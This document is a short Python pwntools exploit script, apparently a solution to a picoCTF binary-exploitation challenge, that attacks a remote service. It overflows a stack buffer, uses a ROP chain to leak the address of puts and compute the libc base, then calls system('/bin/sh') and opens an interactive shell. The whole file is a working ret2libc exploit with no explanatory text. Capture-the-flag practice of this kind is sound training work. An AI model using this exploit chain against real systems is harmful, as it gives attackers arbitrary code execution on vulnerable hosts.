from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./vuln_patched")
lib = ELF("./libc.so.6")

padd = b"A"*(0x80 + 8)
rdi_ret = 0x0000000000400913
ret = 0x000000000040052e

SERV = "wily-courier.picoctf.net"
PORT = 53553

if args.LOCAL:
    p = process("./vuln_patched")
else:
    p = remote(SERV,PORT)


leaklibc = flat(
    padd,
    rdi_ret,
    elf.got.puts,
    elf.plt.puts,
    elf.sym.main
)

p.recvline()
p.sendline(leaklibc)
p.recvline()
puts_leak_addr = u64(p.recv(6).strip().ljust(8,b'\00'))
lib.address = puts_leak_addr - lib.sym.puts
print(hex(lib.address))

payload = flat(
    padd,
    rdi_ret,
    next(lib.search(b"/bin/sh\00")),
    ret,
    lib.sym.system,
)

p.sendline(payload)
p.interactive()
